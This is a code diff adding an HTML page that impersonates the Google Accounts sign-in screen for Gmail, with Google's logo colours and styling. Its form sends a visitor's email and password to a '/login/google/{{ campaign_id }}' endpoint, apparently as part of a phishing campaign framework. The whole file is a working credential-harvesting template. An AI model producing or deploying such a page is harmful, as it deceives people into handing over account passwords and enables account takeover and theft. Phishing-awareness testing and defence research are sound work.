@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; background-color: #1a73e8; border: none; border-radius: 4px; color: white; font-size: 16px; padding: 12px; font-weight: 500; cursor: pointer; margin-top: 20px; }
+        button:hover { background-color: #1557b0; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h2>Sign in</h2>
+        <p>to continue to Gmail</p>
+        <form action="/login/google/{{ campaign_id }}" method="POST">
+            <input type="email" name="username" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
